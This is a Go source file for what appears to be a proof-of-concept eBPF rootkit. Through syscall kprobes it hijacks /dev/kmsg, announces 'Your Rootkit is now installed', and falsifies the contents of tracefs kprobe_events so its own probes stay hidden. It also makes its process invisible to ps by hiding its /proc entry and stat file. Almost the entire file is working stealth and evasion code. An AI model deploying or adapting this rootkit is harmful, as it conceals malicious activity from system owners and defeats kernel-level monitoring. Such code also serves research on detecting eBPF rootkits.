package main

import (
	"encoding/binary"
	"fmt"
	"hash/fnv"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/DataDog/ebpf"
	"github.com/DataDog/ebpf/manager"
)

var mainManager = &manager.Manager{
	Probes: []*manager.Probe{
		{
			Section: "kretprobe/__x64_sys_openat",
		},
		{
			Section: "kprobe/__x64_sys_read",
		},
		{
			Section: "kretprobe/__x64_sys_read",
		},
		{
			Section: "kprobe/vfs_open",
		},
		{
			Section: "kretprobe/vfs_read",
		},
		{
			Section: "kprobe/__x64_sys_close",
		},
		{
			Section: "kprobe/__x64_sys_getdents64",
		},
		{
			UID:     "First",
			Section: "kretprobe/__x64_sys_getdents64",
		},
	},
}

var userWriteManager = &manager.Manager{
	Probes: []*manager.Probe{
		{
			UID:     "Second",
			Section: "kretprobe/__x64_sys_getdents64",
		},
	},
}

const (
	KMsgAction uint64 = iota + 1
	OverrideContent
	OverrideReturn
	HideFile
)

const (
	KMsgProg = iota + KMsgAction
	OverrideContentProg

	FillWithZeroProg = 10
	OverrideGetDents = 11
)

var ByteOrder = binary.LittleEndian

func FNVHashByte(b []byte) uint64 {
	hash := fnv.New64a()
	hash.Write(b)
	return hash.Sum64()
}

func FNVHashStr(s string) uint64 {
	return FNVHashByte([]byte(s))
}

type RkFdContentKey struct {
	ID    uint64
	Chunk uint32
}

// Write write binary representation
func (p *RkFdContentKey) Write(buffer []byte) {
	ByteOrder.PutUint64(buffer[0:8], p.ID)
	ByteOrder.PutUint32(buffer[8:12], p.Chunk)

	var zero uint32
	ByteOrder.PutUint32(buffer[12:16], zero)
}

// Bytes returns array of byte representation
func (p *RkFdContentKey) Bytes() []byte {
	b := make([]byte, 16)
	p.Write(b)
	return b
}

type RkFdContent struct {
	Size    uint64
	Content [64]byte
}

// Write write binary representation
func (p *RkFdContent) Write(buffer []byte) {
	ByteOrder.PutUint64(buffer[0:8], p.Size)
	copy(buffer[8:], p.Content[:])
}

// Bytes returns array of byte representation
func (p *RkFdContent) Bytes() []byte {
	b := make([]byte, len(p.Content)+8)
	p.Write(b)
	return b
}

type RkFdKey struct {
	Fd  uint64
	Pid uint32
}

// Write write binary representation
func (p *RkFdKey) Write(buffer []byte) {
	ByteOrder.PutUint64(buffer[0:8], p.Fd)
	ByteOrder.PutUint32(buffer[8:12], p.Pid)
}

// Bytes returns array of byte representation
func (p *RkFdKey) Bytes() []byte {
	b := make([]byte, 16)
	p.Write(b)
	return b
}

// RkFdAttr represents a file
type RkFdAttr struct {
	Action      uint64
	ReturnValue int64
}

// Write write binary representation
func (p *RkFdAttr) Write(buffer []byte) {
	ByteOrder.PutUint64(buffer[0:8], p.Action)
	ByteOrder.PutUint64(buffer[8:16], uint64(p.ReturnValue))
}

// Bytes returns array of byte representation
func (p *RkFdAttr) Bytes() []byte {
	b := make([]byte, 56)
	p.Write(b)
	return b
}

// RkPathKey represents a path node used to match in-kernel path
type RkPathKey struct {
	Path string
	Pos  uint64
}

// Write write binary representation
func (p *RkPathKey) Write(buffer []byte) {
	hash := FNVHashStr(p.Path)
	ByteOrder.PutUint64(buffer[0:8], hash)
	ByteOrder.PutUint64(buffer[8:16], p.Pos)
}

// Bytes returns array of byte representation
func (p *RkPathKey) Bytes() []byte {
	b := make([]byte, 16)
	p.Write(b)
	return b
}

// RkPathKeys returns a list of RkPathKey for the given path
func RkPathKeys(s string) []RkPathKey {
	var keys []RkPathKey

	els := strings.Split(s, "/")
	last := len(els) - 1

	for i, el := range els {
		keys = append(keys, RkPathKey{
			Path: el,
			Pos:  uint64(last - i),
		})
	}

	return keys
}

// PutPathAttr put the path in the kernel map
func PutPathAttr(m *ebpf.Map, path string, attr PathAttr) error {
	var zeroAttr PathAttr
	for i, key := range RkPathKeys(path) {
		if i == 0 {
			if err := m.Put(key.Bytes(), attr.Bytes()); err != nil {
				return err
			}
		} else {
			if err := m.Put(key.Bytes(), zeroAttr.Bytes()); err != nil {
				return err
			}
		}
	}

	return nil
}

// PathAttr represents attr to apply for a path
type PathAttr struct {
	FSType      string
	Action      uint64
	OverrideID  uint64
	ReturnValue int64
	HiddenHash  uint64
}

// Write write binary representation
func (p *PathAttr) Write(buffer []byte) {
	hash := FNVHashStr(p.FSType)
	ByteOrder.PutUint64(buffer[0:8], hash)
	ByteOrder.PutUint64(buffer[8:16], p.Action)
	ByteOrder.PutUint64(buffer[16:24], uint64(p.ReturnValue))
	ByteOrder.PutUint64(buffer[24:32], p.OverrideID)
	ByteOrder.PutUint64(buffer[32:40], p.HiddenHash)
}

// Bytes returns array of byte representation
func (p *PathAttr) Bytes() []byte {
	b := make([]byte, 40)
	p.Write(b)
	return b
}

var c = []manager.ConstantEditor{
	{
		Name:  "rk_pid",
		Value: uint64(os.Getpid()),
	},
}

func getRkFdKeys(path string) []RkFdKey {
	matches, err := filepath.Glob("/proc/*/fd/*")
	if err != nil {
		return nil
	}

	var keys []RkFdKey
	for _, match := range matches {
		if f, err := os.Readlink(match); err == nil {
			if f == path {
				fd, err := strconv.ParseInt(filepath.Base(match), 10, 64)
				if err != nil {
					continue
				}

				els := strings.Split(match, "/")
				pid, err := strconv.ParseInt(els[2], 10, 64)
				if err != nil {
					continue
				}

				keys = append(keys, RkFdKey{
					Fd:  uint64(fd),
					Pid: uint32(pid),
				})
			}
		}
	}

	return keys
}

func PutFdContent(m *ebpf.Map, id uint64, path string) {
	key := RkFdContentKey{
		ID: id,
	}

	file, err := os.OpenFile(path, os.O_RDONLY, os.ModePerm)
	if err != nil {
		return
	}

	for {
		RkFdContent := RkFdContent{}

		n, err := file.Read(RkFdContent.Content[:])
		if err != nil {
			return
		}

		if n == 0 {
			break
		}

		RkFdContent.Size = uint64(n)

		if err := m.Put(key.Bytes(), RkFdContent.Bytes()); err != nil {
			return
		}

		key.Chunk++
	}
}

func Kmsg(str string) {
	f, err := os.OpenFile("/dev/kmsg", os.O_WRONLY|os.O_APPEND, os.ModePerm)
	if err != nil {
		return
	}
	defer f.Close()

	fmt.Println(str)
	f.WriteString(str)
}

func HandleError(err error) {
	panic(err)
}

func main() {
	options := manager.Options{
		DefaultKProbeMaxActive: 512,
		DefaultProbeRetry:      2,
		DefaultProbeRetryDelay: time.Second,
		ConstantEditors:        c,
	}

	// Initialize the main manager
	if err := mainManager.InitWithOptions(mainAsset(), options); err != nil {
		HandleError(err)
	}

	// Start the manager
	if err := mainManager.Start(); err != nil {
		HandleError(err)
	}

	// block process already having fd on kmsg
	for _, fdKey := range getRkFdKeys("/dev/kmsg") {
		filesMap, _, err := mainManager.GetMap("rk_fd_attrs")
		if err != nil {
			HandleError(err)
		}

		fdAttr := RkFdAttr{
			Action: OverrideReturn,
		}

		if err = filesMap.Put(fdKey.Bytes(), fdAttr.Bytes()); err != nil {
			HandleError(err)
		}
	}

	// block process that will open kmsg
	pathKeysMap, _, _ := mainManager.GetMap("rk_path_keys")
	attr := PathAttr{
		FSType: "devtmpfs",
		Action: OverrideReturn,
	}
	if err := PutPathAttr(pathKeysMap, "kmsg", attr); err != nil {
		HandleError(err)
	}

	Kmsg(fmt.Sprintf("Your Rootkit(%d) is now installed", os.Getpid()))

	// second step
	rkFilesMap, _, _ := mainManager.GetMap("rk_files")
	rkFdAttrsMap, _, _ := mainManager.GetMap("rk_fd_attrs")
	rkFdContentsMap, _, _ := mainManager.GetMap("rk_fd_contents")
	rkGetdentsMap, _, _ := mainManager.GetMap("rk_getdents")

	// Initialize the write user manager with map from main
	options.MapEditors = map[string]*ebpf.Map{
		"rk_files":       rkFilesMap,
		"rk_fd_attrs":    rkFdAttrsMap,
		"rk_fd_contents": rkFdContentsMap,
		"rk_getdents":    rkGetdentsMap,
	}
	options.TailCallRouter = []manager.TailCallRoute{
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(FillWithZeroProg),
			ProbeIdentificationPair: manager.ProbeIdentificationPair{
				Section: "kprobe/fill_with_zero",
			},
		},
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(OverrideGetDents),
			ProbeIdentificationPair: manager.ProbeIdentificationPair{
				Section: "kprobe/override_getdents",
			},
		},
	}

	if err := userWriteManager.InitWithOptions(userWriteAsset(), options); err != nil {
		HandleError(err)
	}

	// Start the user manager
	if err := userWriteManager.Start(); err != nil {
		HandleError(err)
	}

	// update main tail call with the ones from user
	kmsgProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/kmsg"})
	overrideContentProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/override_content"})
	overrideGetDents, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/override_getdents"})
	routes := []manager.TailCallRoute{
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(KMsgProg),
			Program:       kmsgProg[0],
		},
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(OverrideContentProg),
			Program:       overrideContentProg[0],
		},
		{
			ProgArrayName: "rk_progs",
			Key:           uint32(OverrideGetDents),
			Program:       overrideGetDents[0],
		},
	}
	mainManager.UpdateTailCallRoutes(routes...)

	// unblock
	for _, RkFdKey := range getRkFdKeys("/dev/kmsg") {
		filesMap, _, err := mainManager.GetMap("rk_fd_attrs")
		if err != nil {
			HandleError(err)
		}
		filesMap.Delete(RkFdKey.Bytes())
	}

	// change action from override to write user
	attr = PathAttr{
		FSType: "devtmpfs",
		Action: KMsgProg,
	}
	if err := PutPathAttr(pathKeysMap, "kmsg", attr); err != nil {
		HandleError(err)
	}

	attr = PathAttr{
		FSType:     "tracefs",
		Action:     OverrideContent,
		OverrideID: FNVHashStr("kprobe_events"),
	}
	if err := PutPathAttr(pathKeysMap, "kprobe_events", attr); err != nil {
		HandleError(err)
	}

	contentsMap, _, _ := mainManager.GetMap("rk_fd_contents")
	PutFdContent(contentsMap, FNVHashStr("kprobe_events"), "/etc/passwd")

	// ps
	attr = PathAttr{
		FSType:      "proc",
		Action:      OverrideReturn,
		ReturnValue: -1,
	}
	if err := PutPathAttr(pathKeysMap, fmt.Sprintf("%d/stat", os.Getpid()), attr); err != nil {
		HandleError(err)
	}

	attr = PathAttr{
		FSType:     "proc",
		Action:     HideFile,
		HiddenHash: FNVHashStr(fmt.Sprintf("%d", os.Getpid())),
	}
	if err := PutPathAttr(pathKeysMap, "", attr); err != nil {
		HandleError(err)
	}

	wait()

	// Close the managers
	if err := mainManager.Stop(manager.CleanAll); err != nil {
		panic(err)
	}

	if err := userWriteManager.Stop(manager.CleanAll); err != nil {
		panic(err)
	}
}

// wait - Waits until an interrupt or kill signal is sent
func wait() {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, os.Kill)
	<-sig
	fmt.Println()
}
